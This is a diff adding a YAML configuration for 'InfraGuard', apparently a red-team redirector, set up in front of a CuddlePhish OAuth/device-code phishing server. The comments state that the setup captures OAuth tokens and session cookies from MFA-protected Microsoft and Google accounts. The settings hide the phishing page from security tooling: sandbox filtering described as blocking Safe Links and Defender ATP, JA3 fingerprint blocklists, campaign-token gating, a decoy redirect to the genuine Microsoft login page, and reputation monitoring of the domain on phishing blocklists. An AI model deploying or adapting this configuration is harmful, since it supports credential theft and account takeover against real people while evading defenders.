@@ -1,0 +1,104 @@
+# ═══════════════════════════════════════════════════════════════════════
+# InfraGuard — CuddlePhish Example
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Redirector fronting a CuddlePhish OAuth/device-code phishing server.
+# All paths are forwarded — CuddlePhish handles OAuth flow routing
+# internally and the paths change per session. Use allowed_paths to
+# restrict to known OAuth endpoints if desired.
+#
+# CuddlePhish captures OAuth tokens and session cookies from the target's
+# MFA-protected Microsoft/Google accounts. InfraGuard filters scanners
+# and sandbox crawlers before they interact with the phishing flow.
+#
+# Stack:
+#   Target (email link) → InfraGuard (443) → CuddlePhish (8443)
+#
+# Required env vars:
+#   INFRAGUARD_TLS_CERT      - path to TLS cert
+#   INFRAGUARD_TLS_KEY       - path to TLS key
+#   CUDDLEPHISH_UPSTREAM     - e.g. https://127.0.0.1:8443
+#   CAMPAIGN_TOKEN           - per-campaign token for email links
+#   INFRAGUARD_DB_PATH       - SQLite path
+
+listeners:
+  - protocol: "https"
+    bind: "0.0.0.0"
+    port: 443
+    tls:
+      cert: "${INFRAGUARD_TLS_CERT}"
+      key: "${INFRAGUARD_TLS_KEY}"
+    domains:
+      - "auth.example.com"
+
+domains:
+  auth.example.com:
+    upstream: "${CUDDLEPHISH_UPSTREAM}"
+    profile_type: "cuddlephish"
+
+    # Restrict to OAuth endpoints if CuddlePhish paths are predictable:
+    # allowed_paths:
+    #   - "/devicelogin"
+    #   - "/common/oauth2/*"
+    #   - "/common/login"
+    #   - "/kmsi"
+
+    campaign_token:
+      enabled: true
+      token_param: "t"
+      tokens:
+        - "${CAMPAIGN_TOKEN}"
+      score_on_missing: 0.9
+
+    drop_action:
+      type: "redirect"
+      target: "https://login.microsoftonline.com"
+
+pipeline:
+  filter_mode: "scoring"
+  block_score_threshold: 0.65
+  enable_ip_filter: true
+  enable_bot_filter: true
+  enable_header_filter: true
+  enable_geo_filter: true
+  enable_dns_filter: true
+  enable_profile_filter: true
+  enable_replay_filter: false             # OAuth flows are multi-step; replay breaks them
+  enable_enumeration_filter: true
+  enable_sandbox_filter: true             # critical — blocks Safe Links, Defender ATP
+  enable_ja3_filter: true
+  ja3_filter:
+    ja3_header: "x-ja3"
+    log_ja3: true
+    blocked_ja3:
+      - "e7d705a3286e19ea42f587b344ee6865"
+      - "c35b0c7bd583d49d5b0f17de25ecdf7a"
+      - "6734f37431670b3ab4292b8f60f29984"
+      - "b386946a5a44d1ddcc843bc75336dfce"
+
+intel:
+  auto_block_scanners: true
+  dynamic_whitelist_threshold: 3
+  feeds:
+    enabled: true
+  ct_monitor:
+    enabled: true
+    interval_hours: 4.0
+  reputation_monitor:
+    enabled: true
+    interval_hours: 2.0
+    check_urlhaus: true
+    check_openphish: true
+
+tracking:
+  db_path: "${INFRAGUARD_DB_PATH}"
+  retention_days: 14
+
+api:
+  bind: "127.0.0.1"
+  port: 8080
+  health_path: "/up"
+
+logging:
+  level: "INFO"
+  format: "json"
